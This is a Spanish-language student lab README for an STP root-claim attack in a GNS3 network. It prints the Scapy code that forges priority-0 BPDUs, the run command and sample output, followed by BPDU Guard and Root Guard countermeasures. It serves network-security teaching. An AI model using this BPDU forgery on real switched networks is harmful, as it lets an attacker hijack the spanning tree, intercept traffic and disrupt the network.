<div align="center">

# 🌳 STP Claim Root Attack

**Luiggy Habraham Encarnación Cabrera · Matrícula 2025-0663**

![Python](https://img.shields.io/badge/Python-3.10%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)
![Platform](https://img.shields.io/badge/Platform-Kali%20Linux-557C94?style=for-the-badge&logo=linux&logoColor=white)
![Scapy](https://img.shields.io/badge/Library-Scapy-FF6F00?style=for-the-badge)
![GNS3](https://img.shields.io/badge/Simulator-GNS3-009639?style=for-the-badge)
![License](https://img.shields.io/badge/Uso-Educativo-blue?style=for-the-badge)

> Manipulación del proceso de elección STP mediante BPDUs falsificados con prioridad 0, forzando la adopción del atacante como Root Bridge y redirigiendo el tráfico de la red a través de su host.

</div>

---

## ⚠️ Aviso Legal

> [!CAUTION]
> Este repositorio tiene fines **exclusivamente académicos y educativos**.
> Todo el contenido fue ejecutado en un entorno de laboratorio virtualizado y controlado.
> La reproducción de estas técnicas en redes sin autorización expresa es **ilegal**.

---

## 📑 Tabla de Contenido

1. [Objetivo del Laboratorio](#-objetivo-del-laboratorio)
2. [Objetivo del Script](#-objetivo-del-script)
3. [Requisitos](#-requisitos-para-utilizar-la-herramienta)
4. [Instalación](#-instalación)
5. [Documentación de la Red](#-documentación-de-la-red)
6. [Funcionamiento del Script](#-funcionamiento-del-script)
7. [Uso y Ejecución](#-uso-y-ejecución)
8. [Contramedidas](#-contramedidas)
9. [Capturas de Pantalla](#-capturas-de-pantalla)
10. [Video de Demostración](#-video-de-demostración)

---

## 🎯 Objetivo del Laboratorio

Demostrar cómo un atacante conectado a la red puede manipular el protocolo STP (*Spanning Tree Protocol*) enviando BPDUs falsificados con prioridad inferior a la del Root Bridge legítimo. Al recibir estos BPDUs, los switches inician una reelección y adoptan al atacante como nuevo Root Bridge, redirigiendo el tráfico de toda la red a través de su máquina y causando inestabilidad en la topología.

---

## 🧩 Objetivo del Script

El script `stp_root.py` primero escucha BPDUs activos para identificar el Root Bridge legítimo actual y luego envía periódicamente BPDUs Configuration falsificados con prioridad 0 y costo de ruta 0, reclamando el rol de Root Bridge. El envío continuo mantiene la reclamación activa mientras el script está en ejecución.

### Parámetros Usados

| Parámetro | Tipo | Descripción | Ejemplo |
|---|---|---|---|
| Interfaz de red | Interactivo | Interfaz desde la que se envían los BPDUs | `e0` |
| Root Priority | Interactivo | Prioridad anunciada como Root Bridge | `0` |
| Bridge Priority | Interactivo | Prioridad del bridge del atacante | `0` |
| Hello Time | Interactivo | Intervalo en segundos entre BPDUs | `2` |

### Requisitos para Utilizar la Herramienta

| Requisito | Detalle |
|---|---|
| Sistema operativo | Kali Linux 2023+ (o cualquier Linux) |
| Python | 3.10 o superior |
| Librería Scapy | `scapy >= 2.5.0` (módulo STP nativo incluido) |
| Privilegios | `sudo` o `root` obligatorio |
| STP activo | La red debe tener STP habilitado (el script verifica) |
| Conectividad L2 | Enlace activo con al menos un switch del dominio STP |

---

## ⚙️ Instalación

```bash
# 1. Clonar el repositorio
git clone https://github.com/luiggyencarnacion/STP-Root-Attack.git
cd STP-Root-Attack

# 2. Crear entorno virtual
python3 -m venv venv
source venv/bin/activate

# 3. Instalar dependencias
pip install -r requirements.txt

# 4. Verificar módulo STP en Scapy
python3 -c "from scapy.all import STP, Dot3, LLC; print('STP module OK')"
```

**`requirements.txt`**
```
scapy>=2.5.0
```

---

## 🗺️ Documentación de la Red

### Topología (3 Switches)

```
              ┌─────────┐
              │   R-1   │  10.6.63.1/24
              └────┬────┘
                   │ Gig0/0
                   │ Gig0/0
              ┌────┴────┐
              │ SW-CORE │  <- Root Bridge LEGITIMO (prioridad 4096)
              └──┬───┬──┘
         Gig0/1  │   │  Gig0/2
        ┌────────┘   └────────────┐
   ┌────┴────┐               ┌────┴────┐
   │  SW-1   │               │  SW-2   │
   └──┬───┬──┘               └──┬───┬──┘
Gig0/2│   │Gig0/1         Gig0/1│   │Gig0/2
      │   └─────────────────────┘   │
 ┌────┴──────┐                 ┌────┴─────┐
 │KaliLinux-1│                 │   PC1    │
 │ Atacante  │                 │ Victima  │
 │10.6.63.11 │                 │10.6.63.50│
 └───────────┘                 └──────────┘
       e0                           e0

Tras el ataque:
KaliLinux-1 → Root Bridge (prioridad 0)
Todo el tráfico atraviesa el host atacante
```

### Tabla de Conexiones

| Dispositivo | Interfaz local | Conectado a | Interfaz remota |
|---|---|---|---|
| R-1 | Gig0/0 | SW-CORE | Gig0/0 |
| SW-CORE | Gig0/1 | SW-1 | Gig0/0 |
| SW-CORE | Gig0/2 | SW-2 | Gig0/0 |
| SW-1 | Gig0/1 | SW-2 | Gig0/1 |
| SW-1 | Gig0/2 | KaliLinux-1 | e0 |
| SW-2 | Gig0/2 | PC1 | e0 |

### Tabla de Direccionamiento

| Dispositivo | Interfaz | Dirección IP | Máscara | Rol |
|---|---|---|---|---|
| R-1 | Gig0/0 | 10.6.63.1 | /24 | Gateway |
| SW-CORE | — | — | — | Root Bridge legítimo |
| SW-1 | — | — | — | Switch de acceso |
| SW-2 | — | — | — | Switch de acceso |
| KaliLinux-1 | e0 | 10.6.63.11 | /24 | Atacante |
| PC1 | e0 | 10.6.63.50 | /24 | Víctima |

### Roles STP antes y después del ataque

| Dispositivo | Prioridad STP | Rol ANTES | Rol DESPUÉS |
|---|---|---|---|
| SW-CORE | 4096 | Root Bridge | Non-Root Bridge |
| SW-1 | 32768 | Non-Root | Non-Root |
| SW-2 | 32768 | Non-Root | Non-Root |
| KaliLinux-1 | **0** | — | **Root Bridge (atacante)** |

### Detalles del Entorno

| Parámetro | Valor |
|---|---|
| Red | 10.6.63.0/24 |
| Protocolo STP | IEEE 802.1D |
| Simulador | GNS3 |
| Plataforma atacante | Kali Linux |
| VLANs | VLAN 1 (default) |

---

## 🔬 Funcionamiento del Script

### Flujo General

```
Inicio
  └── Ingreso de parámetros (interfaz, prioridades, hello time)
        └── Captura de BPDUs durante 5 segundos
              └── Identifica Root Bridge actual (MAC + prioridad)
              └── Si no hay BPDUs → abortar
        └── Construir BPDU malicioso (prioridad=0, pathcost=0)
              └── Bucle: sendp(BPDU) → sleep(hello_time) → imprimir stats
  └── Ctrl+C → Resumen Final
```

### Construcción del BPDU Malicioso

```python
Dot3(dst="01:80:c2:00:00:00", src=src_mac)
/ LLC(dsap=0x42, ssap=0x42, ctrl=0x03)
/ STP(
    rootid     = 0,        # Prioridad 0 (la más baja posible)
    rootmac    = src_mac,  # MAC del atacante como Root
    pathcost   = 0,        # Costo de ruta mínimo
    bridgeid   = 0,
    bridgemac  = src_mac,
    portid     = 0x8001,
    maxage     = 20,
    hellotime  = 2,
    fwddelay   = 15,
)
```

Los switches comparan `rootid=0` con la prioridad del Root Bridge actual, concluyen que el atacante tiene prioridad más baja y lo adoptan como nuevo Root Bridge.

### Salida en Tiempo Real

```
  [*] Escuchando BPDUs en e0 (5s)...
  [*] Root Bridge actual : 00:11:22:33:44:55  (prioridad 4096)
  ────────────────────────────────────────────────
  [*] Construyendo BPDU con prioridad 0...
  [*] Iniciando reclamo de Root Bridge...

   Tiempo    BPDUs
  ────────────────────────────────────────────────
   00:02         1
   00:04         2
   00:06         3
```

---

## 🚀 Uso y Ejecución

```bash
sudo python3 stp_root.py
```

**Interacción esperada:**

```
  Seleccione interfaz (número o nombre): e0

  Ingrese la Root Priority    (ej: 0) : 0
  Ingrese la Bridge Priority  (ej: 0) : 0
  Ingrese el Hello Time en segundos   : 2
```

**Verificación del impacto:**

```
SW-CORE# show spanning-tree vlan 1

VLAN0001
  Root ID    Priority    0
             Address     0c:e4:2a:xx:xx:xx   <- MAC del ATACANTE
             This bridge is not the root
```

---

## 🔐 Contramedidas

### BPDU Guard + PortFast en Puerto hacia KaliLinux-1

```
SW-1(config)# interface GigabitEthernet0/2
SW-1(config-if)# spanning-tree portfast
SW-1(config-if)# spanning-tree bpduguard enable
SW-1(config-if)# exit
```

Si llega cualquier BPDU por ese puerto, pasa inmediatamente a `err-disabled`, bloqueando el ataque.

### BPDU Guard Global

```
SW-1(config)# spanning-tree portfast bpduguard default
```

### Verificación

```
SW-CORE# show spanning-tree vlan 1
SW-1# show spanning-tree interface GigabitEthernet0/2 detail
```

### Tabla Resumen

| Contramedida | Aplica en | Efectividad | Impacto operacional |
|---|---|---|---|
| BPDU Guard + PortFast | Puertos de acceso | Muy alta | Bajo |
| BPDU Guard global | Todos los puertos PortFast | Muy alta | Bajo |
| Root Guard | Puertos hacia distribución | Muy alta | Bajo |

---

## 📸 Capturas de Pantalla

```
evidencias/
├── 01_topologia_gns3.png
├── 02_spanning_tree_antes_ataque.png
├── 03_ataque_en_ejecucion.png
├── 04_root_bridge_cambiado.png
├── 05_bpdu_guard_aplicado.png
└── 06_spanning_tree_restaurado.png
```

---

## 🎬 Video de Demostración

> 📺 **[Ver demostración en YouTube →](https://youtu.be/ve_pClKvqqo?si=BVjVVlK931jPC-Vo)**

- ✅ Topología en GNS3 con nombre **Luiggy Encarnación** y matrícula **2025-0663**
- ✅ Hora y fecha del sistema visibles
- ✅ Cara y voz del autor
- ✅ `show spanning-tree` antes del ataque (Root Bridge legítimo)
- ✅ Ataque en ejecución con contador de BPDUs
- ✅ `show spanning-tree` durante el ataque (Root Bridge cambiado)
- ✅ Aplicación de BPDU Guard y verificación de bloqueo
- ⏱️ Duración máxima: 5 minutos

---

<div align="center">

*Documento elaborado con fines académicos en un entorno de laboratorio controlado.*
*El uso de estas técnicas fuera de entornos autorizados es ilegal.*

</div>
